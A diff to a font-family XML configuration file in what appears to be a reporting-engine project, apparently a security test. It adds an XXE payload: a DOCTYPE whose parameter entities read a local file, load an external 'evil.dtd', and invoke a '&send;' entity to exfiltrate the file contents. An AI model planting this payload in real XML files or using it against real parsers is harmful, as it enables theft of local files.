@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
+<!DOCTYPE fontFamilies [
+  <!ELEMENT fontFamilies ANY>
+  <!ENTITY % file SYSTEM "file:///Users/dani/workspace/reporting-engine/report-renderer/target/classes/hello.txt">
+  <!ENTITY % dtd SYSTEM "file:///Users/dani/workspace/reporting-engine/report-renderer/target/classes/evil.dtd">
+  %dtd;
+]>
+
 <fontFamilies>
+
+	<data>&send;</data>
 
     <fontFamily name="Arial">
         <normal>fonts/Arial.ttf</normal>
